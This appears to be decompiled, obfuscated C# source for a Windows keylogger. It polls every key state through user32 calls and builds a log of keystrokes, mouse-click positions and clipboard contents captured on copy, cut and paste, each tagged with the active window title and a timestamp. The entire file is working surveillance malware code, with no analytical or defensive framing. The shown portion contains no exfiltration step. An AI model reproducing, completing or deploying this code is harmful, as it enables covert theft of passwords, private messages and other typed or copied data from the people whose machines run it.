using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		internal void method_0()
		{
			if (Class1.smethod_0())
			{
				string_0 = "System.IO.Stream [Clipboard Data is Audio Stream]";
			}
			else if (!Class1.smethod_1())
			{
				if (Class1.smethod_2())
				{
					StringCollection stringCollection_ = Class1.smethod_3();
					string_0 = "System.Collections.Specialized.StringCollection [Clipboard Data is File Drop List]\nFiles:\n";
					StringEnumerator stringEnumerator = Class1.smethod_4(stringCollection_);
					try
					{
						while (Class1.smethod_7(stringEnumerator))
						{
							string string_ = Class1.smethod_5(stringEnumerator);
							string_0 = Class1.smethod_6(string_0, string_, "\n");
						}
						return;
					}
					finally
					{
						if (stringEnumerator is IDisposable idisposable_)
						{
							Class1.smethod_8(idisposable_);
						}
					}
				}
				if (Class1.smethod_9())
				{
					string_0 = Class1.smethod_11("System.String [Clipboard Data is Text]\nText:\n", Class1.smethod_10());
				}
				else
				{
					string_0 = "Clipboard Data Not Retrived!\nPerhaps no data was selected when ctrl+c was pressed :(";
				}
			}
			else
			{
				string_0 = "System.Drawing.Image [Clipboard data is Image]";
			}
		}

		static bool smethod_0()
		{
			return Clipboard.ContainsAudio();
		}

		static bool smethod_1()
		{
			return Clipboard.ContainsImage();
		}

		static bool smethod_2()
		{
			return Clipboard.ContainsFileDropList();
		}

		static StringCollection smethod_3()
		{
			return Clipboard.GetFileDropList();
		}

		static StringEnumerator smethod_4(StringCollection stringCollection_0)
		{
			return stringCollection_0.GetEnumerator();
		}

		static string smethod_5(StringEnumerator stringEnumerator_0)
		{
			return stringEnumerator_0.Current;
		}

		static string smethod_6(string string_1, string string_2, string string_3)
		{
			return string_1 + string_2 + string_3;
		}

		static bool smethod_7(StringEnumerator stringEnumerator_0)
		{
			return stringEnumerator_0.MoveNext();
		}

		static void smethod_8(IDisposable idisposable_0)
		{
			idisposable_0.Dispose();
		}

		static bool smethod_9()
		{
			return Clipboard.ContainsText();
		}

		static string smethod_10()
		{
			return Clipboard.GetText();
		}

		static string smethod_11(string string_1, string string_2)
		{
			return string_1 + string_2;
		}
	}

	public static string string_0;

	public static string string_1;

	public static bool bool_0 = true;

	private static Dictionary<Keys, string> dictionary_0 = new Dictionary<Keys, string>();

	private static Dictionary<Keys, string> dictionary_1 = new Dictionary<Keys, string>();

	private static Dictionary<Keys, string> dictionary_2 = new Dictionary<Keys, string>();

	private static Dictionary<Keys, string> dictionary_3 = new Dictionary<Keys, string>();

	private static bool bool_1 = false;

	private static bool bool_2 = false;

	private static bool bool_3 = false;

	private static bool bool_4 = false;

	private static int int_0 = 17;

	private static int int_1 = 165;

	private static int int_2 = 16;

	[DllImport("user32.dll")]
	public static extern int GetAsyncKeyState(int int_3);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_3);

	private static string smethod_0()
	{
		string string_0 = "";
		Thread thread_ = Class0.smethod_5((ThreadStart)delegate
		{
			if (Class1.smethod_0())
			{
				string_0 = "System.IO.Stream [Clipboard Data is Audio Stream]";
			}
			else if (!Class1.smethod_1())
			{
				if (Class1.smethod_2())
				{
					StringCollection stringCollection_ = Class1.smethod_3();
					string_0 = "System.Collections.Specialized.StringCollection [Clipboard Data is File Drop List]\nFiles:\n";
					StringEnumerator stringEnumerator = Class1.smethod_4(stringCollection_);
					try
					{
						while (Class1.smethod_7(stringEnumerator))
						{
							string string_ = Class1.smethod_5(stringEnumerator);
							string_0 = Class1.smethod_6(string_0, string_, "\n");
						}
						return;
					}
					finally
					{
						if (stringEnumerator is IDisposable idisposable_)
						{
							Class1.smethod_8(idisposable_);
						}
					}
				}
				if (Class1.smethod_9())
				{
					string_0 = Class1.smethod_11("System.String [Clipboard Data is Text]\nText:\n", Class1.smethod_10());
				}
				else
				{
					string_0 = "Clipboard Data Not Retrived!\nPerhaps no data was selected when ctrl+c was pressed :(";
				}
			}
			else
			{
				string_0 = "System.Drawing.Image [Clipboard data is Image]";
			}
		});
		Class0.smethod_6(thread_, ApartmentState.STA);
		Class0.smethod_7(thread_);
		Class0.smethod_8(thread_);
		return string_0;
	}

	private static string smethod_1(Keys keys_0, string string_2)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Invalid comparison between Unknown and I4
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Invalid comparison between Unknown and I4
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		if ((int)keys_0 != 144 && (int)keys_0 != 20 && (int)keys_0 != 145)
		{
			if ((int)keys_0 != 1 && (int)keys_0 != 2)
			{
				if (((int)keys_0 == 88 || (int)keys_0 == 86 || (int)keys_0 == 67) && bool_4)
				{
					Thread.Sleep(100);
					return string_2.Replace("<rtd.clipboard>", smethod_0());
				}
				return string_2;
			}
			string newValue = Class0.smethod_12().X.ToString();
			string newValue2 = Cursor.get_Position().Y.ToString();
			text = string_2.Replace("<rtd.xpos>", newValue);
			return text.Replace("<rtd.ypos>", newValue2);
		}
		Class0.smethod_9(100);
		string string_3 = (Class0.smethod_10(keys_0) ? "Enabled" : "Disabled");
		return Class0.smethod_11(string_2, "<rtd.state>", string_3);
	}

	private static void smethod_2()
	{
		dictionary_0.Add((Keys)13, "\n");
		dictionary_0.Add((Keys)32, " ");
		dictionary_0.Add((Keys)96, "0");
		dictionary_1.Add((Keys)96, " [INSERT] ");
		dictionary_0.Add((Keys)97, "1");
		dictionary_1.Add((Keys)97, " [END] ");
		dictionary_0.Add((Keys)98, "2");
		dictionary_1.Add((Keys)98, " [ARROW, DOWN] ");
		dictionary_0.Add((Keys)99, "3");
		dictionary_1.Add((Keys)99, " [PAGE, DOWN] ");
		dictionary_0.Add((Keys)100, "4");
		dictionary_1.Add((Keys)100, " [ARROW, LEFT] ");
		dictionary_0.Add((Keys)101, "5");
		dictionary_0.Add((Keys)102, "6");
		dictionary_1.Add((Keys)102, " [ARROW, RIGHT] ");
		dictionary_0.Add((Keys)103, "7");
		dictionary_1.Add((Keys)103, " [HOME] ");
		dictionary_0.Add((Keys)104, "8");
		dictionary_1.Add((Keys)104, " [ARROW, UP] ");
		dictionary_0.Add((Keys)105, "9");
		dictionary_1.Add((Keys)105, " [PAGE, UP] ");
		dictionary_0.Add((Keys)107, "+");
		dictionary_0.Add((Keys)8, " [BACKSPACE] ");
		dictionary_0.Add((Keys)20, " [CapsLock, state: <rtd.state>] ");
		dictionary_0.Add((Keys)48, "0");
		dictionary_1.Add((Keys)48, "§");
		dictionary_0.Add((Keys)49, "1");
		dictionary_1.Add((Keys)49, "'");
		dictionary_0.Add((Keys)50, "2");
		dictionary_1.Add((Keys)50, "\"");
		dictionary_0.Add((Keys)51, "3");
		dictionary_1.Add((Keys)51, "+");
		dictionary_0.Add((Keys)52, "4");
		dictionary_1.Add((Keys)52, "!");
		dictionary_0.Add((Keys)53, "5");
		dictionary_1.Add((Keys)53, "%");
		dictionary_0.Add((Keys)54, "6");
		dictionary_1.Add((Keys)54, "/");
		dictionary_0.Add((Keys)55, "7");
		dictionary_1.Add((Keys)55, "=");
		dictionary_0.Add((Keys)56, "8");
		dictionary_1.Add((Keys)56, "(");
		dictionary_0.Add((Keys)57, "9");
		dictionary_1.Add((Keys)57, ")");
		dictionary_0.Add((Keys)46, " [DEL] ");
		dictionary_0.Add((Keys)111, "÷");
		dictionary_0.Add((Keys)40, " [ARROW, DOWN] ");
		dictionary_0.Add((Keys)35, " [END] ");
		dictionary_0.Add((Keys)27, " [ESC] ");
		dictionary_0.Add((Keys)36, " [HOME] ");
		dictionary_0.Add((Keys)45, " [INSERT] ");
		dictionary_0.Add((Keys)1, " [Left Click, Position: x=<rtd.xpos>; y=<rtd.ypos>] ");
		dictionary_0.Add((Keys)37, " [ARROW, LEFT] ");
		dictionary_0.Add((Keys)91, " [LEFT WINDOWS] ");
		dictionary_0.Add((Keys)106, "×");
		dictionary_0.Add((Keys)188, ",");
		dictionary_1.Add((Keys)188, "?");
		dictionary_2.Add((Keys)188, ";");
		dictionary_0.Add((Keys)189, "-");
		dictionary_1.Add((Keys)189, "_");
		dictionary_2.Add((Keys)189, "*");
		dictionary_0.Add((Keys)190, ".");
		dictionary_1.Add((Keys)190, ":");
		dictionary_2.Add((Keys)190, ">");
		dictionary_0.Add((Keys)34, " [PAGE, DOWN] ");
		dictionary_0.Add((Keys)33, " [PAGE, UP] ");
		dictionary_0.Add((Keys)44, " [PRINT SCREEN] ");
		dictionary_0.Add((Keys)2, " [Right Click, Position: x = <rtd.xpos>; y = <rtd.ypos>] ");
		dictionary_0.Add((Keys)39, " [ARROW, RIGHT] ");
		dictionary_0.Add((Keys)92, " [RIGHT WINDOWS] ");
		dictionary_0.Add((Keys)145, " [Scroll Lock, state: <rtd.state>] ");
		dictionary_0.Add((Keys)109, "-");
		dictionary_0.Add((Keys)9, " [TAB] ");
		dictionary_0.Add((Keys)38, " [ARROW, UP] ");
		dictionary_0.Add((Keys)144, " [Num Lock, state: <rtd.state>] ");
		dictionary_2.Add((Keys)83, "đ");
		dictionary_2.Add((Keys)70, "[");
		dictionary_2.Add((Keys)71, "]");
		dictionary_2.Add((Keys)75, "ł");
		dictionary_2.Add((Keys)76, "Ł");
		dictionary_2.Add((Keys)89, ">");
		dictionary_2.Add((Keys)88, "#");
		dictionary_2.Add((Keys)67, "&");
		dictionary_2.Add((Keys)86, "@");
		dictionary_2.Add((Keys)66, "{");
		dictionary_2.Add((Keys)78, "}");
		dictionary_2.Add((Keys)81, "\\");
		dictionary_2.Add((Keys)87, "|");
		dictionary_2.Add((Keys)85, "€");
		dictionary_2.Add((Keys)49, "~");
		dictionary_2.Add((Keys)50, "ˇ");
		dictionary_2.Add((Keys)51, "^");
		dictionary_2.Add((Keys)52, "\u02d8");
		dictionary_2.Add((Keys)53, "°");
		dictionary_2.Add((Keys)54, "\u02db");
		dictionary_2.Add((Keys)55, "`");
		dictionary_2.Add((Keys)56, "\u02d9");
		dictionary_2.Add((Keys)57, "\u00b4");
		dictionary_3.Add((Keys)67, " [Control+C, clipboard: <rtd.clipboard>] ");
		dictionary_3.Add((Keys)86, " [Control+V, clipboard: <rtd.clipboard>] ");
		dictionary_3.Add((Keys)90, " [Control+Z, Undo] ");
		dictionary_3.Add((Keys)70, " [Control+F, Search] ");
		dictionary_3.Add((Keys)88, " [Control+X, clipboard: <rtd.clipboard>] ");
		dictionary_0.Add((Keys)192, "ö");
		dictionary_1.Add((Keys)192, "Ö");
		dictionary_2.Add((Keys)192, "\u02dd");
		dictionary_0.Add((Keys)191, "ü");
		dictionary_1.Add((Keys)191, "Ü");
		dictionary_2.Add((Keys)191, "\u00a8");
		dictionary_0.Add((Keys)187, "ó");
		dictionary_1.Add((Keys)187, "Ó");
		dictionary_0.Add((Keys)219, "ő");
		dictionary_1.Add((Keys)219, "Ő");
		dictionary_2.Add((Keys)219, "÷");
		dictionary_0.Add((Keys)221, "ú");
		dictionary_1.Add((Keys)221, "Ú");
		dictionary_2.Add((Keys)221, "×");
		dictionary_0.Add((Keys)186, "é");
		dictionary_1.Add((Keys)186, "É");
		dictionary_2.Add((Keys)186, "$");
		dictionary_0.Add((Keys)222, "á");
		dictionary_1.Add((Keys)222, "Á");
		dictionary_2.Add((Keys)222, "ß");
		dictionary_0.Add((Keys)220, "ű");
		dictionary_1.Add((Keys)220, "Ű");
		dictionary_2.Add((Keys)220, "¤");
		dictionary_0.Add((Keys)226, "í");
		dictionary_1.Add((Keys)226, "Í");
		dictionary_2.Add((Keys)226, "<");
		bool_1 = true;
	}

	public static void smethod_3()
	{
		if (!bool_1)
		{
			smethod_2();
		}
		while (true)
		{
			Class0.smethod_9(10);
			if (!bool_0)
			{
				continue;
			}
			for (int i = 0; i < 255; i++)
			{
				int asyncKeyState = GetAsyncKeyState(i);
				if (asyncKeyState != 1 && asyncKeyState != -32767)
				{
					continue;
				}
				bool_2 = Class0.smethod_13(GetAsyncKeyState(int_2));
				bool_3 = Class0.smethod_13(GetAsyncKeyState(int_1));
				bool_4 = Class0.smethod_13(GetAsyncKeyState(int_0));
				string text = "";
				if (dictionary_0.ContainsKey((Keys)i))
				{
					text = dictionary_0[(Keys)i];
					text = smethod_1((Keys)i, text);
					if (dictionary_1.ContainsKey((Keys)i) && bool_2)
					{
						text = dictionary_1[(Keys)i];
					}
					if (dictionary_2.ContainsKey((Keys)i) && bool_3)
					{
						text = dictionary_2[(Keys)i];
					}
					if (dictionary_3.ContainsKey((Keys)i) && bool_4 && !bool_3)
					{
						text = dictionary_3[(Keys)i];
						text = smethod_1((Keys)i, text);
					}
				}
				else
				{
					text = "";
				}
				if (Class0.smethod_14(string_1, smethod_4()))
				{
					if (!Class0.smethod_15(text, ""))
					{
						string text2 = Class0.smethod_17((object)(Keys)i);
						if (!Class0.smethod_10((Keys)20) && !bool_2)
						{
							text2 = Class0.smethod_18(text2);
						}
						if (!Class0.smethod_19(Class0.smethod_18(text2), "shift") && !Class0.smethod_19(Class0.smethod_18(text2), "menu") && !Class0.smethod_19(Class0.smethod_18(text2), "control"))
						{
							if (dictionary_1.ContainsKey((Keys)i) && bool_2)
							{
								text2 = dictionary_1[(Keys)i];
								Class0.smethod_20("Shift override applied to text");
							}
							if (dictionary_2.ContainsKey((Keys)i) && bool_3)
							{
								text2 = dictionary_2[(Keys)i];
								Class0.smethod_20("Alt Gr override applied to text");
							}
							if (dictionary_3.ContainsKey((Keys)i) && bool_4 && !bool_3)
							{
								text2 = dictionary_3[(Keys)i];
								text2 = smethod_1((Keys)i, text2);
								Class0.smethod_20("Ctrl override applied to text /normal text/");
							}
							string_0 = Class0.smethod_16(string_0, text2);
						}
						else
						{
							Class0.smethod_20(Class0.smethod_16("Keys Supressed: ", text2));
						}
					}
					else
					{
						string_0 = Class0.smethod_16(string_0, text);
					}
					break;
				}
				bool flag = false;
				if (Class0.smethod_15(text, ""))
				{
					string_0 = string_0 + "\n[" + smethod_4() + "  Time: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + "]\n " + text;
					flag = true;
				}
				else
				{
					string text3 = Convert.ToString((object)(Keys)i);
					if (Control.IsKeyLocked((Keys)20) || bool_2)
					{
						Console.WriteLine("Caps: " + Control.IsKeyLocked((Keys)20));
					}
					else
					{
						text3 = text3.ToLower();
						Console.WriteLine("Key is lower");
					}
					if (!text3.ToLower().Contains("shift") && !text3.ToLower().Contains("menu") && !text3.ToLower().Contains("control"))
					{
						if (dictionary_1.ContainsKey((Keys)i) && bool_2)
						{
							text = dictionary_1[(Keys)i];
							Console.WriteLine("Shift override applied to text");
						}
						if (dictionary_2.ContainsKey((Keys)i) && bool_3)
						{
							text3 = dictionary_2[(Keys)i];
							Console.WriteLine("Alt Gr override applied to text");
						}
						if (dictionary_3.ContainsKey((Keys)i) && bool_4 && !bool_3)
						{
							text3 = dictionary_3[(Keys)i];
							text3 = smethod_1((Keys)i, text3);
							Console.WriteLine("Ctrl override applied to text /normal text/");
						}
						string_0 = string_0 + "\n[" + smethod_4() + "  Time: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + "]\n " + text3;
						flag = true;
					}
					else
					{
						Console.WriteLine("Keys Supressed: " + text3);
					}
				}
				if (flag)
				{
					string_1 = smethod_4();
				}
				break;
			}
		}
	}

	private static string smethod_4()
	{
		StringBuilder stringBuilder = Class0.smethod_21(256);
		if (GetWindowText(GetForegroundWindow(), stringBuilder, 256) > 0)
		{
			return Class0.smethod_22((object)stringBuilder);
		}
		return null;
	}

	static Thread smethod_5(ThreadStart threadStart_0)
	{
		return new Thread(threadStart_0);
	}

	static void smethod_6(Thread thread_0, ApartmentState apartmentState_0)
	{
		thread_0.SetApartmentState(apartmentState_0);
	}

	static void smethod_7(Thread thread_0)
	{
		thread_0.Start();
	}

	static void smethod_8(Thread thread_0)
	{
		thread_0.Join();
	}

	static void smethod_9(int int_3)
	{
		Thread.Sleep(int_3);
	}

	static bool smethod_10(Keys keys_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		return Control.IsKeyLocked(keys_0);
	}

	static string smethod_11(string string_2, string string_3, string string_4)
	{
		return string_2.Replace(string_3, string_4);
	}

	static Point smethod_12()
	{
		return Cursor.get_Position();
	}

	static bool smethod_13(int int_3)
	{
		return Convert.ToBoolean(int_3);
	}

	static bool smethod_14(string string_2, string string_3)
	{
		return string_2 == string_3;
	}

	static bool smethod_15(string string_2, string string_3)
	{
		return string_2 != string_3;
	}

	static string smethod_16(string string_2, string string_3)
	{
		return string_2 + string_3;
	}

	static string smethod_17(object object_0)
	{
		return Convert.ToString(object_0);
	}

	static string smethod_18(string string_2)
	{
		return string_2.ToLower();
	}

	static bool smethod_19(string string_2, string string_3)
	{
		return string_2.Contains(string_3);
	}

	static void smethod_20(string string_2)
	{
		Console.WriteLine(string_2);
	}

	static StringBuilder smethod_21(int int_3)
	{
		return new StringBuilder(int_3);
	}

	static string smethod_22(object object_0)
	{
		return object_0.ToString();
	}
}
